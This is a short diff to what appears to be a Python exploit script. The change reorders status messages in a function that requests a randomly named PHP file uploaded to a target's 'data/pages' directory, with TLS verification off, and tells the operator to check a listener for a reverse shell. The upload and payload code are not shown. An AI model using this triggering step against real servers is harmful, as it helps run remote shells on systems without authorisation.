@@ -238,12 +238,15 @@ def exploit(address, file, name):
 
 
 def execute(address, file, name):
+    print(
+            f"{settings.i3}making web request to uploaded file."
+    )
+    print(
+            f"{settings.i3}check listener if reverse shell uploaded."
+        )
     url_request = requests.get(
         address + f'data/pages/{random_filename.name}.php',
         verify=False
-    )
-    print(
-            f"{settings.i3}web request made to uploaded file."
     )
     if url_request.status_code == 404:
         print(
@@ -253,9 +256,6 @@ def execute(address, file, name):
             f"{settings.c0}"
         )
     else:
-        print(
-            f"\n{settings.i3}check listener if reverse shell uploaded."
-        )
         sys.exit()
 
 
